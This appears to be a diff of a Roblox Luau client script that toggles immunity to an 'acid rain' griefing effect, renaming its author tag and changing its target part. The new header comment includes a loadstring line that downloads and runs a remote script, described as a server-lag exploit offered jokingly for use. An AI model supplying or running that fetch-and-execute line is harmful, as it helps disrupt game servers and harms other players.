@@ -1,27 +1,21 @@
-﻿--[[
-    Script:         Acid Rain Immunity Shield
-    Version:        4.1 (Intel-Tuned)
-    Author:         Callum (Security & Architecture Analyst)
-    
-    Analysis:       This version incorporates user-provided intelligence. The interceptor's
-                    target signature has been updated from a generic placeholder to the
-                    exact instance name ("Acid") confirmed from the game's ReplicatedStorage.
-                    This ensures maximum interception accuracy and effectiveness. The core
-                    zero-failure architecture remains unchanged.
+--[[
+
+this script makes you immune to the summon acid and summon acid rain feature in the zfucker exploit, meaning it's server lag function won't work on you.
+this script is a defense against other users who would use the zfucker exploit script.
+for context and for lolz i provided the loadstring for zfucker, meaning you could lag the server and be fine!! you're also a loser for even wanting to lag the server.
+
+
+ loadstring(request({
+    Url = "https://raw.githubusercontent.com/osukfcdays/zlfucker/refs/heads/main/main.luau"
+}).Body)()
+
+
 ]]
 
--- =================================================================================================
--- // SECTION 1: CONFIGURATION
--- =================================================================================================
-
 local CONFIG = {
-    -- [UPDATED] The target name is now set to "Acid" based on the provided path.
-    ACID_PART_NAME = "Acid",
+    ACID_PART_NAME = "Spit"
 }
 
--- =================================================================================================
--- // SECTION 2: CORE LOGIC & STATE
--- =================================================================================================
 
 local Workspace: Workspace = game:GetService("Workspace")
 local Debris: Debris = game:GetService("Debris")
@@ -32,7 +26,6 @@ local State = {
     IsImmunityActive = false
 }
 
---- The core defensive function. Identifies and nullifies incoming acid effects.
 local function toggleAcidInterceptor(enabled: boolean)
     if State.InterceptorConnection then
         State.InterceptorConnection:Disconnect()
@@ -48,12 +41,9 @@ local function toggleAcidInterceptor(enabled: boolean)
     end
 end
 
--- =================================================================================================
--- // SECTION 3: UI CREATION & MAIN THREAD
--- =================================================================================================
 
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "Callum_ImmunityShield_" .. math.random(1, 1000)
+screenGui.Name = "Sigma_ImmunityShield_" .. math.random(1, 1000)
 screenGui.ResetOnSpawn = false
 
 local immunityToggle = Instance.new("TextButton")
@@ -76,11 +66,11 @@ immunityToggle.MouseButton1Click:Connect(function()
     if State.IsImmunityActive then
         immunityToggle.BackgroundColor3 = Color3.fromRGB(40, 150, 90)
         immunityToggle.Text = "Acid Immunity: ON"
-        print("Callum's Immunity Shield: ACTIVATED")
+        print("Sigma Immunity Shield: ACTIVATED")
     else
         immunityToggle.BackgroundColor3 = Color3.fromRGB(150, 40, 40)
         immunityToggle.Text = "Acid Immunity: OFF"
-        print("Callum's Immunity Shield: DEACTIVATED")
+        print("Sigma Immunity Shield: DEACTIVATED")
     end
 end)
 
@@ -90,5 +80,5 @@ screenGui.Destroying:Connect(function()
     if State.InterceptorConnection then
         State.InterceptorConnection:Disconnect()
     end
-    print("Callum's Immunity Shield has been removed.")
+    print("Sigma Immunity Shield has been removed.")
 end)
